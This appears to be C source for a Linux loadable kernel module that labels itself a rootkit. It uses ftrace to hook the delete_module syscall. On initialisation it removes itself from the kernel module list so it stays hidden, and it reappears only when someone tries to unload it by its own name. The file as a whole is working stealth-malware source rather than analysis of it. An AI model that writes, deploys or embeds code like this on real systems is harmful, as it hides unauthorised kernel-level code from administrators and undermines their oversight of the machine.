
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/version.h>
#include <linux/tcp.h>
#include "ftrace_helper.h"
#include <linux/inet.h>
#include <linux/ip.h>
#include <linux/ipv6.h>
#include <linux/string.h>
#include <linux/netfilter_defs.h>
#include <linux/delay.h>
#include <linux/namei.h>
#include <linux/syscalls.h>
#include <linux/fs.h>

    
#define rootkit_name "root_working_hide"

MODULE_LICENSE("GPL");
MODULE_VERSION("0.02");


static asmlinkage long (*orig_delete_module_func)(const struct pt_regs *);
static struct list_head *prev_module;


static void hideme(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

static void showme(void)
{
    list_add(&THIS_MODULE->list, prev_module);
}

asmlinkage long delete_module_func(const struct pt_regs *regs)
{
    long ret;
    //add find_module fuction from kernal


    char module_name[MODULE_NAME_LEN];
    int name_len;
    struct module mod;
    const char __user *name_user = (const char __user *)regs->di;
    //copy from user
    name_len = copy_from_user(module_name, name_user, MODULE_NAME_LEN -1 );
    printk(KERN_INFO "name_len %d", name_len);
    if (name_len < 0 ) {
        printk(KERN_INFO "failed");
        goto done;     
    }
    //adding null bit at the end
    module_name[MODULE_NAME_LEN - 1] = '\0';
    printk(KERN_INFO "module_name: %s\n",module_name);

    if  (strcmp(module_name,rootkit_name) == 0){
        printk(KERN_INFO "deleting myself");
        showme();
    } 

done:
    printk(KERN_INFO "done");
    ret = orig_delete_module_func(regs);    
    return ret;
}



/* Declare the struct that ftrace needs to hook the syscall */
static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_delete_module", delete_module_func, &orig_delete_module_func),

};

/* Module initialization function */
static int __init rootkit_init(void)
{
    /* Hook the syscall and print to the kernel buffer */
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;
    hideme();

    printk(KERN_INFO "rootkit: Loaded >:-)\n");

    return 0;
}

static void __exit rootkit_exit(void)
{
    /* Unhook and restore the syscall and print to the kernel buffer */
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
